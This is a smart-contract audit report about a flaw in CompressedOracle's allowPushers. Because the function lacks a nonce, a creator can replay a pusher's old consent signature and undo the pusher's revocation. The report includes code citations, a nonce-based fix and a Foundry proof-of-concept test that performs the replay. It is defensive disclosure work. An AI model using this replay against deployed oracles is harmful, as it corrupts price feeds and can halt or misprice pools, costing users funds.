Audit Report

## Title
`allowPushers` consent signature replay re-establishes revoked pusher delegation within deadline window — (File: smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol)

## Summary
`CompressedOracleV1.allowPushers` verifies a pusher's EIP-191 consent signature but neither tracks consumed signatures nor includes a per-pusher nonce. The sole replay barrier is the deadline check. After a pusher self-revokes via `revokePusher`, the namespace creator can replay the original signature (while the deadline remains valid) to silently re-establish the delegation, routing all subsequent pusher writes into the creator's namespace and leaving the pusher's own pool with stale (timestamp=0) oracle data.

## Finding Description
`allowPushers` constructs the signed digest as:

```solidity
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
);
require(pusher == ECDSA.recover(hash, signatures[i]));
namespaceRemapping[pusher] = msg.sender;
``` [1](#0-0) 

There is no nonce, no per-pusher sequence counter, and no `usedSignatures` mapping. The only guard is `_ensureDeadline`, which passes as long as `block.timestamp <= deadline`. [2](#0-1) 

`revokePusher` sets `namespaceRemapping[msg.sender] = address(0)`: [3](#0-2) 

Because the signed digest does not change between the first and second `allowPushers` call (same `deadline`, same `pusher`, same `msg.sender`), the creator can immediately replay the identical `(deadline, pushers, signatures)` arguments. Both `_ensureDeadline` and `ECDSA.recover` pass, and `namespaceRemapping[pusher] = msg.sender` is written again — exactly reversing the revocation. The code's own comment acknowledges the deadline is the sole replay barrier: [4](#0-3) 

After re-delegation, the `fallback` push path resolves the namespace from `namespaceRemapping[msg.sender]`: [5](#0-4) 

All subsequent pushes from the pusher land in the creator's namespace, not the pusher's own namespace.

## Impact Explanation
After replay, the pusher's own pool reads from `feedIdOf(pusher, slotIndex, positionIndex)`, which was never updated — its timestamp remains 0. Every consumer rejects timestamp=0 as stale, causing bad-price execution or a complete halt of swaps on the pusher's pool. Simultaneously, the creator's pool receives oracle data it was not entitled to receive after revocation, constituting unauthorized oracle data injection into a live pool's price feed. This meets the **bad-price execution** and **broken core pool functionality causing loss of funds** impact criteria.

## Likelihood Explanation
The creator retains the pusher's consent signature bytes after the initial `allowPushers` call — no additional keys or privileges are required. Deadlines are caller-controlled and can be set arbitrarily far in the future. The replay requires only the creator's EOA and the stored signature. The pusher has no on-chain mechanism to invalidate the old signature before the deadline expires. Any creator motivated to prevent a pusher from operating independently after revocation can execute this attack at any time within the deadline window.

## Recommendation
Add a per-pusher nonce to the signed message and increment it on each successful delegation:

```solidity
mapping(address pusher => uint256) public pusherNonce;

// In allowPushers:
bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
    keccak256(abi.encode(
        block.chainid, address(this), deadline,
        pusher, msg.sender, pusherNonce[pusher]++
    ))
);
```

Alternatively, maintain a `mapping(bytes32 => bool) usedSignatures` and mark each digest as consumed after first use, preventing any signature from being accepted more than once regardless of deadline.

## Proof of Concept
```solidity
function test_allowPushers_replayAfterRevoke() public {
    uint256 deadline = block.timestamp + 365 days;

    // 1. Pusher signs consent for creator
    bytes32 digest = MessageHashUtils.toEthSignedMessageHash(
        keccak256(abi.encode(block.chainid, address(oracle), deadline, pusher, creator))
    );
    (uint8 v, bytes32 r, bytes32 s) = vm.sign(PUSHER_KEY, digest);
    bytes memory sig = abi.encodePacked(r, s, v);

    address[] memory pushers_ = new address[](1);
    pushers_[0] = pusher;
    bytes[] memory sigs = new bytes[](1);
    sigs[0] = sig;

    // 2. Creator delegates pusher
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers_, sigs);
    assertEq(oracle.namespaceRemapping(pusher), creator);

    // 3. Pusher revokes
    vm.prank(pusher);
    oracle.revokePusher();
    assertEq(oracle.namespaceRemapping(pusher), address(0));

    // 4. Creator replays the SAME signature — revocation silently undone
    vm.prank(creator);
    oracle.allowPushers(deadline, pushers_, sigs); // succeeds, no revert
    assertEq(oracle.namespaceRemapping(pusher), creator); // delegation restored

    // 5. Pusher's subsequent pushes land in creator's namespace
    //    Pusher's own pool reads stale data (timestamp=0) → bad-price execution
    uint56 tsMs = uint56(block.timestamp * 1000);
    uint48 raw = _packRaw(1_000_000, 2, 2);
    vm.prank(pusher);
    (bool ok,) = address(oracle).call(_wordAt(0, 0, raw, tsMs));
    assertTrue(ok);
    assertGt(oracle.getOracleData(oracle.feedIdOf(creator, 0, 0)).price, 0);
    assertEq(oracle.getOracleData(oracle.feedIdOf(pusher, 0, 0)).price, 0);
}
```

### Citations

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L186-192)
```text
    /// @notice Delegates pusher wallets into the caller's namespace. The pusher's EIP-191
    ///         signature is REQUIRED — without it anyone could remap a foreign pusher
    ///         wallet into their own namespace and silently swallow its pushes. The
    ///         deadline is likewise required: the signed consent carries no timestamp of
    ///         its own, so an undated signature could re-establish a delegation AFTER the
    ///         pusher revoked it.
    function allowPushers(uint256 deadline, address[] calldata pushers, bytes[] memory signatures) external {
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L204-209)
```text
            bytes32 hash = MessageHashUtils.toEthSignedMessageHash(
                keccak256(abi.encode(block.chainid, address(this), deadline, pusher, msg.sender))
            );
            require(pusher == ECDSA.recover(hash, signatures[i]));

            namespaceRemapping[pusher] = msg.sender;
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L238-243)
```text
    function revokePusher() external {
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0) || creator == msg.sender) revert NoSelfRemapping();
        namespaceRemapping[msg.sender] = address(0);
        emit PusherRevoked(msg.sender, creator);
    }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/CompressedOracle.sol (L315-321)
```text
        address creator = namespaceRemapping[msg.sender];
        if (creator == address(0)) creator = msg.sender;

        assembly ("memory-safe") {
            end := calldatasize()
            namespace := shl(96, creator) // [creator:20][zeros:12]
        }
```

**File:** smart-contracts-poc/contracts/oracles/compressed/OracleBase.sol (L124-126)
```text
    function _ensureDeadline(uint256 deadline) internal view virtual {
        require(block.timestamp <= deadline, DeadlineExceeded());
    }
```
